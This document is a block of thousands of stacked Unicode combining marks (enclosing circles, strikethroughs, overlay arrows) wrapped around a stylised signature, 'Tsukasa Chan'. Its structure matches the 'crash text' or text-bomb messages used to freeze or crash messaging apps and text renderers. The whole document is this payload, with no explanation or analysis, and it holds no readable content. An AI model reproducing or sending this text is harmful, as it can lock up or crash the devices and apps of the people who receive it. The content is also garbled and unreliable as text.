⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢